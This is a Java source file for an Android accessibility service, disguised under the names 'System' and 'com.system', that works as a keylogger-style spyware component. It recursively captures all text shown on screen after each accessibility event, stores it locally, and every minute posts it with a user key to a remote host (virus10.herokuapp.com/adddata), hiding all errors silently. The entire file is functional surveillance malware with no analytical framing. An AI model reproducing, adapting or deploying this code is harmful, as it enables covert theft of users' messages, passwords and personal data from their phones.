package com.system;

import android.accessibilityservice.AccessibilityService;
import android.content.SharedPreferences;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;


public class System extends AccessibilityService {
Thread th=null;
    SharedPreferences sp=null;
    SharedPreferences.Editor spe=null;
    Thread th1=null;
    boolean working=true;
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            if (sp == null) {
                sp = getSharedPreferences("Data", MODE_PRIVATE);
                spe = sp.edit();
            }
            if (th == null) {
                th = new Thread("Helper") {
                    @Override
                    public void run() {
                        try {
                            MainWork();
                        } catch (Exception e) {
                        }
                    }
                };
                th.start();
            }
            if (!th.isAlive()) {
                th = new Thread("Helper") {
                    @Override
                    public void run() {
                        try {
                            MainWork();
                        } catch (Exception e) {
                        }
                    }
                };
                th.start();
            }


            th1 = new Thread() {
                @Override
                public void run() {
                    working = false;
                    String data = getAllText(getRootInActiveWindow());
                    if (data != null && !data.isEmpty()) {
                        spe.putString("data", sp.getString("data","")+data);
                        spe.commit();
                    }
                    try {
                        sleep(5000);
                    } catch (Exception e) {
                    }
                    working = true;
                }
            };
            if (working && event != null) {
                th1.start();
            }

        }catch (Exception e){}
    }


    public String getAllText(AccessibilityNodeInfo info){
        String result="";
        if (info==null){
            return "";
        }
        try {
            CharSequence cs=info.getText();
            if (cs != null && !cs.toString().isEmpty()) {
                result += cs.toString();
            }
        }catch (Exception e){}
        for(int x=0;x<info.getChildCount();x++){
            result+=getAllText(info.getChild(x));
        }
        return result;
    }



    public void MainWork(){
        while(true){
            try {
                String key=GET("https://virus10.herokuapp.com/unickey");
                key=sp.getString("user",key);
                if (!sp.getString("data","").isEmpty()){
                    JSONObject jo=new JSONObject();
                    jo.put("user",key);
                    jo.put("data",sp.getString("data",""));
                    String res=POST("https://virus10.herokuapp.com/adddata",jo.toString());

                    if(res.equals("ok")) {
                        spe.putString("user", key);
                        spe.putString("data", "");
                        spe.commit();
                    }
                }
            }catch (Exception e){

            }
            try {
                Thread.sleep(60000);
            }catch (Exception e){}
        }
    }


    @Override
    public void onInterrupt() {

    }



    public String GET(String link) throws Exception {
        URL url=new URL(link);
        HttpURLConnection conn= (HttpURLConnection) url.openConnection();
        conn.setDoInput(true);
        conn.setRequestMethod("GET");
        InputStream is=conn.getInputStream();
        conn.connect();
        if (conn.getResponseCode()!=200){
            throw new Exception();
        }

        String result="";
        BufferedReader isr=new BufferedReader(new InputStreamReader(is));
        String d;
        while((d=isr.readLine())!=null){
            result+=d;
        }
        return result;
    }
    public String POST(String link,String data) throws Exception {
        URL url=new URL(link);
        HttpURLConnection conn= (HttpURLConnection) url.openConnection();
        conn.setDoInput(true);
        if(data!=null) {
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type","application/json");
            OutputStream os = conn.getOutputStream();
            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
            byte[] input = data.getBytes("utf-8");
            os.write(input, 0, input.length);
            writer.close();
        }else{
            conn.setRequestMethod("GET");
        }
        InputStream is=conn.getInputStream();
        conn.connect();
        if(conn.getResponseCode()!=200){
            throw new Exception("Status not same");
        }
        String result="";
        BufferedReader isr=new BufferedReader(new InputStreamReader(is));
        String d;
        while((d=isr.readLine())!=null){
            result+=d;
        }
        return result;
    }
}